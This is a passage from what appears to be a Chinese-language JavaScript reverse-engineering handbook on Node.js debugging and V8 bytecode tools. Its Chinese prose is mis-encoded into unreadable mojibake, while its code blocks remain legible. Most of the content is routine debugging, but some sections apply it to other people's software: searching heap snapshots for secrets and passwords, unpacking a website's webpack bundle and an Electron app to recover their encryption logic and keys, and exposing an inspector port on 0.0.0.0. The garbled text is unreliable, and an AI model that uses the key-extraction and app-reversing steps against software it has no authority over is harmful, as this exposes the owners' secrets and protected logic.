<p><strong>æ›´çµæ´»çš„é…ç½®æ–¹å¼</strong>ï¼š</p>
<p>åˆ›å»º <code>.vscode/launch.json</code>ï¼š</p>
<pre><code class="language-json">{
  &quot;version&quot;: &quot;0.2.0&quot;,
  &quot;configurations&quot;: [
    {
      &quot;type&quot;: &quot;node&quot;,
      &quot;request&quot;: &quot;launch&quot;,
      &quot;name&quot;: &quot;è°ƒè¯•å½“å‰æ–‡ä»¶&quot;,
      &quot;skipFiles&quot;: [&quot;&lt;node_internals&gt;/**&quot;],
      &quot;program&quot;: &quot;${file}&quot;,
      &quot;console&quot;: &quot;integratedTerminal&quot;
    },
    {
      &quot;type&quot;: &quot;node&quot;,
      &quot;request&quot;: &quot;launch&quot;,
      &quot;name&quot;: &quot;è°ƒè¯• NPM Script&quot;,
      &quot;runtimeExecutable&quot;: &quot;npm&quot;,
      &quot;runtimeArgs&quot;: [&quot;run&quot;, &quot;start&quot;],
      &quot;console&quot;: &quot;integratedTerminal&quot;
    },
    {
      &quot;type&quot;: &quot;node&quot;,
      &quot;request&quot;: &quot;attach&quot;,
      &quot;name&quot;: &quot;é™„åŠ åˆ°è¿›ç¨‹&quot;,
      &quot;port&quot;: 9229,
      &quot;restart&quot;: true
    }
  ]
}
</code></pre>
<p><strong>ä½¿ç”¨æ–¹æ³•</strong>:</p>
<ol>
<li>F5 å¯åŠ¨è°ƒè¯•</li>
<li>åœ¨ä»£ç ä¸­ç‚¹å‡»è¡Œå·å·¦ä¾§æ‰“æ–­ç‚¹</li>
<li>å•æ­¥è°ƒè¯• (F10/F11)</li>
</ol>
<h3>2.3 è°ƒè¯• Webpack æ‰“åŒ…è¿‡ç¨‹</h3>
<p><strong>åœºæ™¯</strong>: ç†è§£ Webpack å¦‚ä½•å¤„ç†æ¨¡å—</p>
<p><strong>webpack.config.js</strong>:</p>
<pre><code class="language-javascript">module.exports = {
  entry: &quot;./src/index.js&quot;,
  output: {
    filename: &quot;bundle.js&quot;,
    path: __dirname + &quot;/dist&quot;,
  },
  module: {
    rules: [
      {
        test: /\.js$/,
        use: &quot;./my-custom-loader.js&quot;, // è‡ªå®šä¹‰ Loader
      },
    ],
  },
};
</code></pre>
<p><strong>è°ƒè¯• Loader</strong>:</p>
<p><code>.vscode/launch.json</code>:</p>
<pre><code class="language-json">{
  &quot;type&quot;: &quot;node&quot;,
  &quot;request&quot;: &quot;launch&quot;,
  &quot;name&quot;: &quot;è°ƒè¯• Webpack&quot;,
  &quot;program&quot;: &quot;${workspaceFolder}/node_modules/webpack/bin/webpack.js&quot;,
  &quot;args&quot;: [&quot;--mode&quot;, &quot;development&quot;],
  &quot;console&quot;: &quot;integratedTerminal&quot;
}
</code></pre>
<p>åœ¨ <code>my-custom-loader.js</code> ä¸­æ‰“æ–­ç‚¹ï¼š</p>
<pre><code class="language-javascript">module.exports = function (source) {
  debugger; // è‡ªåŠ¨æ–­åœ¨è¿™é‡Œ
  console.log(&quot;æ­£åœ¨å¤„ç†:&quot;, this.resourcePath);
  // ä½ çš„ Loader é€»è¾‘
  return source;
};
</code></pre>
<hr />
<h2>3. è°ƒè¯•ç¬¬ä¸‰æ–¹åŒ…</h2>
<h3>3.1 è°ƒè¯• node_modules</h3>
<p><strong>é—®é¢˜</strong>: ç¬¬ä¸‰æ–¹åŒ…ä»£ç åœ¨ <code>node_modules</code> ä¸­ï¼Œå¦‚ä½•è°ƒè¯•ï¼Ÿ</p>
<p><strong>æ–¹æ³• 1: ç¦ç”¨ skipFiles</strong></p>
<p><code>.vscode/launch.json</code>:</p>
<pre><code class="language-json">{
  &quot;skipFiles&quot;: [
    // &quot;&lt;node_internals&gt;/**&quot;,  // æ³¨é‡Šæ‰è¿™è¡Œ
    // &quot;node_modules/**&quot;       // æ³¨é‡Šæ‰è¿™è¡Œ
  ]
}
</code></pre>
<p><strong>æ–¹æ³• 2: åªè·³è¿‡ç‰¹å®šåŒ…</strong></p>
<pre><code class="language-json">{
  &quot;skipFiles&quot;: [
    &quot;&lt;node_internals&gt;/**&quot;,
    &quot;node_modules/express/**&quot;, // è·³è¿‡ express
    &quot;node_modules/lodash/**&quot; // è·³è¿‡ lodash
  ]
}
</code></pre>
<p><strong>æ–¹æ³• 3: ä½¿ç”¨ npm link</strong></p>
<pre><code class="language-bash"># è¿›å…¥ç¬¬ä¸‰æ–¹åŒ…ç›®å½•
cd ~/projects/suspicious-package

# åˆ›å»ºå…¨å±€é“¾æ¥
npm link

# å›åˆ°é¡¹ç›®ç›®å½•
cd ~/my-project

# é“¾æ¥åˆ°æœ¬åœ°åŒ…ï¼ˆæ›¿ä»£ node_modules ä¸­çš„ç‰ˆæœ¬ï¼‰
npm link suspicious-package
</code></pre>
<p>ç°åœ¨å¯ä»¥ç›´æ¥åœ¨ <code>~/projects/suspicious-package</code> ä¸­æ‰“æ–­ç‚¹è°ƒè¯•ã€‚</p>
<h3>3.2 è°ƒè¯•åŠ å¯†åº“</h3>
<p><strong>æ¡ˆä¾‹</strong>: é€†å‘æŸåŠ å¯†ç®—æ³•</p>
<pre><code class="language-javascript">// åœ¨ä½ çš„ä»£ç ä¸­
const crypto = require(&quot;crypto-js&quot;); // ç¬¬ä¸‰æ–¹åŠ å¯†åº“

// 1. æ‰¾åˆ°åº“çš„æºç ä½ç½®
// node_modules/crypto-js/core.js

// 2. åœ¨ VSCode ä¸­æ‰“å¼€è¯¥æ–‡ä»¶ï¼Œæ‰“æ–­ç‚¹

// 3. è¿è¡Œè°ƒè¯•
const encrypted = crypto.AES.encrypt(&quot;data&quot;, &quot;key&quot;);
// â†’ è‡ªåŠ¨æ–­åœ¨ crypto-js å†…éƒ¨
</code></pre>
<hr />
<h2>4. å†…å­˜ä¸æ€§èƒ½åˆ†æ</h2>
<h3>4.1 Heap Snapshot (å †å¿«ç…§)</h3>
<p><strong>åœºæ™¯</strong>: æŸ¥æ‰¾å†…å­˜æ³„æ¼æˆ–æå–åŠ å¯†å¯†é’¥</p>
<p><strong>æ–¹æ³• 1: é€šè¿‡ Chrome DevTools</strong></p>
<ol>
<li>è¿æ¥åˆ° Node.js è¿›ç¨‹</li>
<li>Memory é¢æ¿ â†’ &quot;Take snapshot&quot;</li>
<li>æœç´¢å…³é”®å­—ï¼ˆå¦‚ <code>secret</code>, <code>key</code>, <code>password</code>ï¼‰</li>
<li>æŸ¥çœ‹å­—ç¬¦ä¸²å¯¹è±¡çš„å€¼</li>
</ol>
<p><strong>æ–¹æ³• 2: é€šè¿‡ä»£ç ç”Ÿæˆ</strong></p>
<pre><code class="language-javascript">const v8 = require(&quot;v8&quot;);
const fs = require(&quot;fs&quot;);

// ç”Ÿæˆå †å¿«ç…§
const snapshot = v8.writeHeapSnapshot();
console.log(&quot;å¿«ç…§å·²ä¿å­˜åˆ°:&quot;, snapshot);

// ä½¿ç”¨ Chrome DevTools åŠ è½½ .heapsnapshot æ–‡ä»¶
</code></pre>
<p><strong>æå–å¯†é’¥ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// 1. ç”Ÿæˆå¿«ç…§
const snapshot = v8.writeHeapSnapshot();

// 2. åœ¨ Chrome DevTools ä¸­åŠ è½½
// 3. æœç´¢ &quot;1234567890abcdef&quot; (æ€€ç–‘çš„å¯†é’¥)
// 4. æ‰¾åˆ°å¯¹è±¡ï¼ŒæŸ¥çœ‹å¼•ç”¨é“¾ï¼Œå®šä½åˆ°ä»£ç ä½ç½®
</code></pre>
<h3>4.2 CPU Profiling (CPU æ€§èƒ½åˆ†æ)</h3>
<p><strong>åœºæ™¯</strong>: æ‰¾å‡ºè€—æ—¶çš„åŠ å¯†/æ··æ·†å‡½æ•°</p>
<p><strong>æ–¹æ³• 1: é€šè¿‡ Chrome DevTools</strong></p>
<ol>
<li>Profiler é¢æ¿ â†’ Start</li>
<li>æ‰§è¡Œç›®æ ‡æ“ä½œ</li>
<li>Stop â†’ æŸ¥çœ‹ Flame Chart</li>
</ol>
<p><strong>æ–¹æ³• 2: é€šè¿‡ä»£ç </strong></p>
<pre><code class="language-javascript">const inspector = require(&quot;inspector&quot;);
const fs = require(&quot;fs&quot;);

const session = new inspector.Session();
session.connect();

// å¼€å§‹æ€§èƒ½åˆ†æ
session.post(&quot;Profiler.enable&quot;);
session.post(&quot;Profiler.start&quot;);

// æ‰§è¡Œç›®æ ‡ä»£ç 
expensiveEncryptFunction();

// åœæ­¢å¹¶ä¿å­˜
session.post(&quot;Profiler.stop&quot;, (err, { profile }) =&gt; {
  fs.writeFileSync(&quot;profile.cpuprofile&quot;, JSON.stringify(profile));
  console.log(&quot;æ€§èƒ½åˆ†æå·²ä¿å­˜&quot;);
  session.disconnect();
});
</code></pre>
<p><strong>åˆ†æç»“æœ</strong>:</p>
<ul>
<li>åœ¨ Chrome DevTools â†’ Profiler â†’ Load profile</li>
<li>æŸ¥çœ‹ &quot;Self Time&quot; æœ€é•¿çš„å‡½æ•° â†’ è¿™å°±æ˜¯æ€§èƒ½ç“¶é¢ˆ</li>
<li>é€šå¸¸æ˜¯åŠ å¯†/æ··æ·†çš„æ ¸å¿ƒé€»è¾‘</li>
</ul>
<h3>4.3 Timeline (æ—¶é—´çº¿åˆ†æ)</h3>
<pre><code class="language-javascript">const { performance } = require(&quot;perf_hooks&quot;);

// æ ‡è®°å¼€å§‹
performance.mark(&quot;encrypt-start&quot;);

encrypt(largeData);

// æ ‡è®°ç»“æŸ
performance.mark(&quot;encrypt-end&quot;);

// æµ‹é‡è€—æ—¶
performance.measure(&quot;encrypt&quot;, &quot;encrypt-start&quot;, &quot;encrypt-end&quot;);

const measure = performance.getEntriesByName(&quot;encrypt&quot;)[0];
console.log(`åŠ å¯†è€—æ—¶: ${measure.duration}ms`);
</code></pre>
<hr />
<h2>5. è°ƒè¯•å¼‚æ­¥ä»£ç </h2>
<h3>5.1 Promise è°ƒè¯•</h3>
<p><strong>é—®é¢˜</strong>: Promise é“¾ä¸­çš„é”™è¯¯éš¾ä»¥è¿½è¸ª</p>
<p><strong>è§£å†³æ–¹æ¡ˆ 1: async/await</strong></p>
<pre><code class="language-javascript">// âŒ éš¾ä»¥è°ƒè¯•
fetch(url)
  .then((res) =&gt; res.json())
  .then((data) =&gt; process(data))
  .catch((err) =&gt; console.error(err));

// âœ… æ˜“äºè°ƒè¯•
async function fetchData() {
  const res = await fetch(url); // æ–­ç‚¹
  const data = await res.json(); // æ–­ç‚¹
  return process(data); // æ–­ç‚¹
}
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ 2: å¯ç”¨ async stack traces</strong></p>
<p>åœ¨ Chrome DevTools ä¸­ï¼š</p>
<ul>
<li>Settings â†’ Enable async stack traces</li>
</ul>
<h3>5.2 è°ƒè¯•äº‹ä»¶å¾ªç¯</h3>
<p><strong>æŸ¥çœ‹å½“å‰äº‹ä»¶å¾ªç¯çŠ¶æ€</strong>:</p>
<pre><code class="language-javascript">const async_hooks = require(&quot;async_hooks&quot;);

const hooks = async_hooks.createHook({
  init(asyncId, type, triggerAsyncId) {
    console.log(`[Init] ${type} (id=${asyncId}, trigger=${triggerAsyncId})`);
  },
  before(asyncId) {
    console.log(`[Before] ${asyncId}`);
  },
  after(asyncId) {
    console.log(`[After] ${asyncId}`);
  },
});

hooks.enable();

// è¿è¡Œä½ çš„å¼‚æ­¥ä»£ç 
setTimeout(() =&gt; {
  console.log(&quot;Timeout executed&quot;);
}, 1000);
</code></pre>
<h3>5.3 è°ƒè¯• setInterval æ³„æ¼</h3>
<p><strong>é—®é¢˜</strong>: setInterval æ²¡æœ‰æ­£ç¡®æ¸…ç†ï¼Œå¯¼è‡´å†…å­˜æ³„æ¼</p>
<p><strong>æ£€æµ‹æ–¹æ³•</strong>:</p>
<pre><code class="language-javascript">const timers = new Set();

const originalSetInterval = global.setInterval;
global.setInterval = function (...args) {
  const timer = originalSetInterval(...args);
  timers.add(timer);
  console.log(&quot;[setInterval]&quot;, args[1], &quot;å·²åˆ›å»º&quot;, timers.size, &quot;ä¸ªå®šæ—¶å™¨&quot;);
  return timer;
};

const originalClearInterval = global.clearInterval;
global.clearInterval = function (timer) {
  timers.delete(timer);
  console.log(&quot;[clearInterval] å·²æ¸…ç†&quot;, timers.size, &quot;ä¸ªå®šæ—¶å™¨å‰©ä½™&quot;);
  return originalClearInterval(timer);
};
</code></pre>
<hr />
<h2>6. è°ƒè¯• ES6+ ç‰¹æ€§</h2>
<h3>6.1 è°ƒè¯• ES Modules</h3>
<p><strong>é—®é¢˜</strong>: ä½¿ç”¨ <code>import</code>/<code>export</code> çš„æ¨¡å—æ— æ³•ç›´æ¥è°ƒè¯•</p>
<p><strong>æ–¹æ³• 1: åŸç”Ÿæ”¯æŒ (Node.js 14+)</strong></p>
<pre><code class="language-json">// package.json
{
  &quot;type&quot;: &quot;module&quot;
}
</code></pre>
<pre><code class="language-bash">node --inspect-brk --experimental-modules script.mjs
</code></pre>
<p><strong>æ–¹æ³• 2: ä½¿ç”¨ babel-node</strong></p>
<pre><code class="language-bash">npm install -D @babel/node @babel/core @babel/preset-env

# è°ƒè¯•
node --inspect-brk node_modules/@babel/node/bin/babel-node.js script.js
</code></pre>
<h3>6.2 è°ƒè¯• TypeScript</h3>
<p><strong>æ–¹æ³• 1: ts-node</strong></p>
<pre><code class="language-bash">npm install -D ts-node

# è°ƒè¯•
node --inspect-brk -r ts-node/register script.ts
</code></pre>
<p><strong>æ–¹æ³• 2: Source Maps</strong></p>
<p><code>tsconfig.json</code>:</p>
<pre><code class="language-json">{
  &quot;compilerOptions&quot;: {
    &quot;sourceMap&quot;: true,
    &quot;outDir&quot;: &quot;./dist&quot;
  }
}
</code></pre>
<p><code>.vscode/launch.json</code>:</p>
<pre><code class="language-json">{
  &quot;type&quot;: &quot;node&quot;,
  &quot;request&quot;: &quot;launch&quot;,
  &quot;name&quot;: &quot;è°ƒè¯• TypeScript&quot;,
  &quot;program&quot;: &quot;${workspaceFolder}/src/index.ts&quot;,
  &quot;preLaunchTask&quot;: &quot;tsc: build - tsconfig.json&quot;,
  &quot;outFiles&quot;: [&quot;${workspaceFolder}/dist/**/*.js&quot;],
  &quot;sourceMaps&quot;: true
}
</code></pre>
<hr />
<h2>7. è¿œç¨‹è°ƒè¯•</h2>
<h3>7.1 è°ƒè¯•ç”Ÿäº§ç¯å¢ƒ</h3>
<p><strong>è­¦å‘Š</strong>: ç”Ÿäº§ç¯å¢ƒè°ƒè¯•éœ€è°¨æ…ï¼Œå¯èƒ½å½±å“æ€§èƒ½</p>
<p><strong>å¯åŠ¨æœåŠ¡å™¨</strong>:</p>
<pre><code class="language-bash"># æœåŠ¡å™¨ç«¯ï¼ˆå…è®¸æ‰€æœ‰ IP è¿æ¥ï¼‰
node --inspect=0.0.0.0:9229 server.js
</code></pre>
<p><strong>æœ¬åœ°è¿æ¥</strong>:</p>
<pre><code class="language-bash"># SSH éš§é“è½¬å‘
ssh -L 9229:localhost:9229 user@remote-server

# ç°åœ¨è®¿é—® chrome://inspect å³å¯è°ƒè¯•è¿œç¨‹æœåŠ¡å™¨
</code></pre>
<p><strong>å®‰å…¨å»ºè®®</strong>:</p>
<ul>
<li>ä»…åœ¨å¼€å‘/æµ‹è¯•ç¯å¢ƒä½¿ç”¨</li>
<li>ä½¿ç”¨ SSH éš§é“ï¼Œä¸è¦ç›´æ¥æš´éœ²è°ƒè¯•ç«¯å£</li>
<li>è°ƒè¯•åç«‹å³å…³é—­</li>
</ul>
<h3>7.2 Docker å®¹å™¨è°ƒè¯•</h3>
<p><strong>Dockerfile</strong>:</p>
<pre><code class="language-dockerfile">FROM node:18
WORKDIR /app
COPY . .
RUN npm install

# æš´éœ²è°ƒè¯•ç«¯å£
EXPOSE 9229

CMD [&quot;node&quot;, &quot;--inspect=0.0.0.0:9229&quot;, &quot;server.js&quot;]
</code></pre>
<p><strong>è¿è¡Œ</strong>:</p>
<pre><code class="language-bash"># æ˜ å°„è°ƒè¯•ç«¯å£
docker run -p 9229:9229 -p 3000:3000 my-app

# è®¿é—® chrome://inspect
</code></pre>
<p><strong>docker-compose.yml</strong>:</p>
<pre><code class="language-yaml">version: &quot;3&quot;
services:
  app:
    build: .
    ports:
      - &quot;3000:3000&quot;
      - &quot;9229:9229&quot;
    command: node --inspect=0.0.0.0:9229 server.js
    volumes:
      - .:/app
      - /app/node_modules # é¿å…è¦†ç›–
</code></pre>
<hr />
<h2>8. è°ƒè¯•æŠ€å·§ä¸æœ€ä½³å®è·µ</h2>
<h3>8.1 æ¡ä»¶æ–­ç‚¹</h3>
<p>åœ¨ Chrome DevTools æˆ– VSCode ä¸­ï¼š</p>
<pre><code class="language-javascript">// å³é”®æ–­ç‚¹ â†’ Edit breakpoint â†’ Condition
user_id === 123;

// æˆ–åœ¨ä»£ç ä¸­
if (user_id === 123) {
  debugger;
}
</code></pre>
<h3>8.2 Logpoints (æ—¥å¿—ç‚¹)</h3>
<p><strong>ä¸ä¿®æ”¹æºç çš„æƒ…å†µä¸‹æ‰“å°æ—¥å¿—</strong>:</p>
<p>VSCode: å³é”®è¡Œå· â†’ &quot;Add Logpoint&quot;</p>
<pre><code class="language-javascript">// è¯­æ³•ï¼ˆä¸éœ€è¦ console.logï¼‰
&quot;user_id:&quot;, user_id, &quot;key:&quot;, key;
</code></pre>
<h3>8.3 Watch è¡¨è¾¾å¼</h3>
<p>åœ¨ Watch é¢æ¿æ·»åŠ è¡¨è¾¾å¼ï¼š</p>
<pre><code class="language-javascript">JSON.stringify(params);
Buffer.from(key).toString(&quot;hex&quot;);
new Date(timestamp);
</code></pre>
<h3>8.4 ç¯å¢ƒå˜é‡è°ƒè¯•</h3>
<pre><code class="language-bash"># è®¾ç½®ç¯å¢ƒå˜é‡
export DEBUG=*  # å¯ç”¨æ‰€æœ‰ debug æ—¥å¿—
export NODE_ENV=development

# åœ¨ä»£ç ä¸­è¯»å–
console.log(process.env.DEBUG);
</code></pre>
<p><strong>ä½¿ç”¨ debug æ¨¡å—</strong>:</p>
<pre><code class="language-javascript">const debug = require(&quot;debug&quot;)(&quot;app:encrypt&quot;);

function encrypt(data, key) {
  debug(&quot;åŠ å¯†å¼€å§‹, data=%s, key=%s&quot;, data, key.toString(&quot;hex&quot;));
  // ...
  debug(&quot;åŠ å¯†å®Œæˆ, result=%s&quot;, result);
  return result;
}
</code></pre>
<p>è¿è¡Œ:</p>
<pre><code class="language-bash">DEBUG=app:* node script.js
</code></pre>
<h3>8.5 REPL è°ƒè¯•</h3>
<p><strong>åœ¨è¿è¡Œæ—¶è¿›å…¥ REPL</strong>:</p>
<pre><code class="language-javascript">const repl = require(&quot;repl&quot;);

function complexFunction(data) {
  const step1 = process1(data);

  // è¿›å…¥ REPL æ£€æŸ¥ä¸­é—´ç»“æœ
  if (process.env.DEBUG) {
    console.log(&quot;è¿›å…¥ REPL è°ƒè¯•...&quot;);
    const r = repl.start(&quot;&gt; &quot;);
    r.context.step1 = step1; // å¯¼å‡ºå˜é‡åˆ° REPL
    r.context.data = data;
  }

  const step2 = process2(step1);
  return step2;
}
</code></pre>
<p>è¿è¡Œ:</p>
<pre><code class="language-bash">DEBUG=1 node script.js

# åœ¨ REPL ä¸­
&gt; step1
&gt; JSON.stringify(step1)
&gt; .exit  // é€€å‡º REPL ç»§ç»­æ‰§è¡Œ
</code></pre>
<hr />
<h2>9. å®æˆ˜æ¡ˆä¾‹</h2>
<h3>æ¡ˆä¾‹ 1ï¼šé€†å‘ Webpack æ‰“åŒ…çš„åŠ å¯†é€»è¾‘</h3>
<p><strong>ç›®æ ‡</strong>: æŸç½‘ç«™çš„ JS æ˜¯ Webpack æ‰“åŒ…çš„ï¼Œæ‰¾åˆ°åŠ å¯†å‡½æ•°</p>
<p><strong>æ­¥éª¤</strong>:</p>
<ol>
<li><strong>ä¸‹è½½æ‰“åŒ…åçš„ JS</strong>:</li>
</ol>
<pre><code class="language-bash">curl https://example.com/app.bundle.js &gt; app.bundle.js
</code></pre>
<ol start="2">
<li><strong>ä½¿ç”¨ webcrack åæ‰“åŒ…</strong>:</li>
</ol>
<pre><code class="language-bash">npm install -g webcrack
webcrack app.bundle.js -o ./unpacked
</code></pre>
<ol start="3">
<li><strong>æ‰¾åˆ°åŠ å¯†å‡½æ•°</strong> (å‡è®¾åœ¨ <code>./unpacked/module_123.js</code>):</li>
</ol>
<pre><code class="language-javascript">function encrypt(data) {
  // å¤æ‚çš„åŠ å¯†é€»è¾‘
}
</code></pre>
<ol start="4">
<li><strong>åˆ›å»ºæµ‹è¯•è„šæœ¬</strong> <code>test.js</code>:</li>
</ol>
<pre><code class="language-javascript">// å¤åˆ¶ module_123.js çš„å†…å®¹
const encrypt = require(&quot;./unpacked/module_123.js&quot;);

// æµ‹è¯•
const result = encrypt(&quot;Hello&quot;);
console.log(result);
</code></pre>
<ol start="5">
<li><strong>è°ƒè¯•</strong>:</li>
</ol>
<pre><code class="language-bash">node --inspect-brk test.js
</code></pre>
<ol start="6">
<li><strong>åœ¨ DevTools ä¸­</strong>:<ul>
<li>å•æ­¥è°ƒè¯• <code>encrypt</code> å‡½æ•°</li>
<li>æŸ¥çœ‹ä¸­é—´å˜é‡</li>
<li>æå–å¯†é’¥/ç®—æ³•</li>
</ul>
</li>
</ol>
<h3>æ¡ˆä¾‹ 2ï¼šè°ƒè¯• Electron åº”ç”¨</h3>
<p><strong>ç›®æ ‡</strong>: é€†å‘æŸ Electron æ¡Œé¢åº”ç”¨çš„åŠ å¯†é€šä¿¡</p>
<p><strong>æ­¥éª¤</strong>:</p>
<ol>
<li><strong>æ‰¾åˆ°åº”ç”¨çš„ asar æ–‡ä»¶</strong>:</li>
</ol>
<pre><code class="language-bash"># macOS
cd /Applications/MyApp.app/Contents/Resources
ls app.asar

# Windows
cd C:\Program Files\MyApp\resources
dir app.asar
</code></pre>
<ol start="2">
<li><strong>è§£åŒ… asar</strong>:</li>
</ol>
<pre><code class="language-bash">npm install -g asar

asar extract app.asar app_unpacked
cd app_unpacked
</code></pre>
<ol start="3">
<li><strong>å¯åŠ¨è°ƒè¯•æ¨¡å¼</strong>:</li>
</ol>
<pre><code class="language-bash"># è®¾ç½®ç¯å¢ƒå˜é‡
export ELECTRON_ENABLE_LOGGING=1
export ELECTRON_RUN_AS_NODE=1

# å¯åŠ¨ Electron å¹¶é™„åŠ è°ƒè¯•å™¨
electron --inspect-brk=5858 .
</code></pre>
<ol start="4">
<li><strong>è¿æ¥ Chrome DevTools</strong>:</li>
</ol>
<pre><code>chrome://inspect
</code></pre>
<ol start="5">
<li><strong>åˆ†æåŠ å¯†é€»è¾‘</strong>:<ul>
<li>åœ¨ <code>main.js</code> æˆ– <code>renderer.js</code> ä¸­æœç´¢åŠ å¯†ç›¸å…³å‡½æ•°</li>
<li>æ‰“æ–­ç‚¹è°ƒè¯•</li>
</ul>
</li>
</ol>
<h3>æ¡ˆä¾‹ 3ï¼šHook require() è¿½è¸ªæ¨¡å—åŠ è½½</h3>
<p><strong>ç›®æ ‡</strong>: æŸ¥çœ‹è„šæœ¬åŠ è½½äº†å“ªäº›æ¨¡å—</p>
<pre><code class="language-javascript">// hook-require.js
const Module = require(&quot;module&quot;);
const originalRequire = Module.prototype.require;

Module.prototype.require = function (id) {
  console.log(&quot;[require]&quot;, id);

  // æ‹¦æˆªç‰¹å®šæ¨¡å—
  if (id === &quot;crypto&quot;) {
    console.log(&quot;[Hook] æ‹¦æˆª crypto æ¨¡å—&quot;);
    debugger; // æ–­ç‚¹
  }

  return originalRequire.apply(this, arguments);
};

// åŠ è½½ç›®æ ‡è„šæœ¬
require(&quot;./suspicious-script.js&quot;);
</code></pre>
<p><strong>è¿è¡Œ</strong>:</p>
<pre><code class="language-bash">node --inspect-brk hook-require.js
</code></pre>
<hr />
<h2>10. å·¥å…·æ¨è</h2>
<table>
<thead>
<tr>
  <th>å·¥å…·</th>
  <th>ç”¨é€”</th>
  <th>å®‰è£…</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>ndb</strong></td>
  <td>Google å¼€å‘çš„å¢å¼ºç‰ˆè°ƒè¯•å™¨</td>
  <td><code>npm install -g ndb</code></td>
</tr>
<tr>
  <td><strong>node-inspector</strong></td>
  <td>æ—§ç‰ˆ Node.js è°ƒè¯•å™¨ï¼ˆå·²åºŸå¼ƒï¼‰</td>
  <td>-</td>
</tr>
<tr>
  <td><strong>nodemon</strong></td>
  <td>è‡ªåŠ¨é‡å¯ + è°ƒè¯•</td>
  <td><code>npm install -g nodemon</code></td>
</tr>
<tr>
  <td><strong>debug</strong></td>
  <td>æ¡ä»¶æ—¥å¿—è¾“å‡º</td>
  <td><code>npm install debug</code></td>
</tr>
<tr>
  <td><strong>why-is-node-running</strong></td>
  <td>æŸ¥æ‰¾é˜»æ­¢é€€å‡ºçš„èµ„æº</td>
  <td><code>npm install why-is-node-running</code></td>
</tr>
</tbody>
</table>
<p><strong>ndb ä½¿ç”¨</strong>:</p>
<pre><code class="language-bash">ndb script.js

# æˆ–è°ƒè¯• npm script
ndb npm start
</code></pre>
<p><strong>nodemon + è°ƒè¯•</strong>:</p>
<pre><code class="language-bash">nodemon --inspect-brk script.js
</code></pre>
<p><strong>why-is-node-running ä½¿ç”¨</strong>:</p>
<pre><code class="language-javascript">const why = require(&quot;why-is-node-running&quot;);

setTimeout(() =&gt; {
  why(); // æ‰“å°æ‰€æœ‰æœªå…³é—­çš„èµ„æº
}, 5000);
</code></pre>
<hr />
<h2>æ€»ç»“</h2>
<p>Node.js è°ƒè¯•çš„å…³é”®æŠ€èƒ½ï¼š</p>
<ol>
<li>âœ… <strong>åŸºç¡€è°ƒè¯•</strong>: <code>--inspect-brk</code> + Chrome DevTools / VSCode</li>
<li>âœ… <strong>å†…å­˜åˆ†æ</strong>: Heap Snapshot æå–å¯†é’¥å’Œæ•æ„Ÿæ•°æ®</li>
<li>âœ… <strong>æ€§èƒ½åˆ†æ</strong>: CPU Profiler å®šä½è€—æ—¶å‡½æ•°</li>
<li>âœ… <strong>å¼‚æ­¥è°ƒè¯•</strong>: async/await + async stack traces</li>
<li>âœ… <strong>ç¬¬ä¸‰æ–¹åŒ…è°ƒè¯•</strong>: npm link + ç¦ç”¨ skipFiles</li>
<li>âœ… <strong>è¿œç¨‹è°ƒè¯•</strong>: SSH éš§é“ + Docker ç«¯å£æ˜ å°„</li>
<li>âœ… <strong>å®æˆ˜æŠ€å·§</strong>: Hook requireã€æ¡ä»¶æ–­ç‚¹ã€REPL è°ƒè¯•</li>
</ol>
<p><strong>è®°ä½</strong>: Node.js è°ƒè¯•çš„æœ¬è´¨æ˜¯åˆ©ç”¨ Chrome DevTools Protocolï¼ŒæŒæ¡äº†æµè§ˆå™¨è°ƒè¯•ï¼Œå°±æŒæ¡äº† Node.js è°ƒè¯•ã€‚</p>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-15">æµè§ˆå™¨å¼€å‘è€…å·¥å…·</a></li>
<li><a href="#section-30">åŠ¨æ€å‚æ•°åˆ†æ</a></li>
<li><a href="#section-22">AST å·¥å…·</a></li>
<li><a href="#section-20">Puppeteer ä¸ Playwright</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-24">
                                                <h2>[R23] V8 Tools</h2>
                                                <h1>R23: V8 å¼•æ“å·¥å…·</h1>
<h2>æ¦‚è¿°</h2>
<p>å½“æˆ‘ä»¬åœ¨åˆ†ææ·±åº¦æ··æ·†ä»£ç ï¼Œæˆ–è€…ç ”ç©¶æµè§ˆå™¨æ¼æ´æ—¶ï¼Œæ™®é€šçš„ JS è°ƒè¯•å™¨å¯èƒ½ä¸å¤Ÿç”¨äº†ã€‚è¿™æ—¶æˆ‘ä»¬éœ€è¦ç›´æ¥ä½¿ç”¨ V8 å¼•æ“æä¾›çš„å·¥å…·æ¥æŸ¥çœ‹å­—èŠ‚ç ï¼ˆBytecodeï¼‰å’Œä¼˜åŒ–è¿‡ç¨‹ã€‚</p>
<hr />
<h2>1. D8 (Debug8)</h2>
<p>D8 æ˜¯ V8 å¼•æ“çš„ç‹¬ç«‹ Shellï¼Œç±»ä¼¼ Node.js çš„ REPLï¼Œä½†æä¾›äº†æ›´å¤šåº•å±‚ APIã€‚</p>
<h3>å®‰è£…</h3>
<p>é€šå¸¸å¯ä»¥é€šè¿‡ <code>jsvu</code> (JavaScript Version Updater) æ¥å®‰è£…æœ€æ–°æˆ–ç‰¹å®šç‰ˆæœ¬çš„ V8/D8ã€‚</p>
<pre><code class="language-bash">npm install -g jsvu
jsvu # æŒ‰ç…§æç¤ºé€‰æ‹© install v8
</code></pre>
<h3>æŸ¥çœ‹å­—èŠ‚ç  (--print-bytecode)</h3>
<p>é€™æ˜¯åˆ†ææ··æ·†é€»è¾‘çš„ç¥å™¨ã€‚å³ä¾¿æºç å˜é‡åè¢«æ··æ·†äº†ï¼Œå…¶åº•å±‚çš„å­—èŠ‚ç æ“ä½œæ˜¯ä¸ä¼šå˜çš„ã€‚</p>
<pre><code class="language-bash">v8 --print-bytecode script.js
</code></pre>
<p>è¾“å‡ºç¤ºä¾‹ï¼š</p>
<pre><code>[generated bytecode for function: test (0x...)]
Parameter count 2
Register count 1
Frame size 8
   12 E&gt; 0x... @    0 : a0                StackCheck
   23 S&gt; 0x... @    1 : 25 02             Ldar a1
   25 E&gt; 0x... @    3 : 34 03 00          Add a0, [0]
   30 S&gt; 0x... @    6 : a4                Return
</code></pre>
<p>é€šè¿‡é˜…è¯» Bytecodeï¼Œæˆ‘ä»¬å¯ä»¥è¿˜åŸå‡ºæ•°å­¦è¿ç®—é€»è¾‘ã€‚</p>
<hr />
<h2>2. æ€§èƒ½ä¸ä¼˜åŒ–åˆ†æ</h2>
<h3>Turbolizer</h3>
